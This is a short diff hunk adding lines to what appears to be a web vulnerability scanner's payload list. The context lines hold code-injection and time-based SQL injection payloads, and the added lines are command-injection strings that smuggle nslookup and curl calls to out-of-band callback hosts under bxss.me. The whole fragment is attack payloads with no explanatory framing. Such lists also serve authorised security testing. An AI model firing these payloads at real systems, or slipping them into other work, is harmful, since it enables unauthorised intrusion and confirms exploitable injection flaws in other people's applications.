@@ -2329,3 +2329,5 @@ geth(ostbyname(lc('hitrc'.'jvtjohbef6c76.bxss.me.')).'A'.chr(67).chr(hex('58')).
 '+'A'.concat(70-3.concat(22*4).concat(117).concat(73).concat(118).concat(90)+(require'socket' Socket.gethostbyname('hitjs'+'mktmlxgwe6f3e.bxss.me.')[3].to_s)+')
 'A'.concat(70-3.concat(22*4).concat(102).concat(77).concat(101).concat(86)+(require'socket' Socket.gethostbyname('hitdh'+'ejtfuucn4f0d2.bxss.me.')[3].to_s))
 if(now(=sysdate(),sleep(40.742),0))
+|(nslookup -q=cname hitobueuyueyqa9663.bxss.me||curl hitobueuyueyqa9663.bxss.me)
+;(nslookup -q=cname hitocbofyhfnx5dcf2.bxss.me||curl hitocbofyhfnx5dcf2.bxss.me|(nslookup -q=cname hitocbofyhfnx5dcf2.bxss.me||curl hitocbofyhfnx5dcf2.bxss.me)&(nslookup -q=cname hitocbofyhfnx5dcf2.bxss.me||curl hitocbofyhfnx5dcf2.bxss.me))
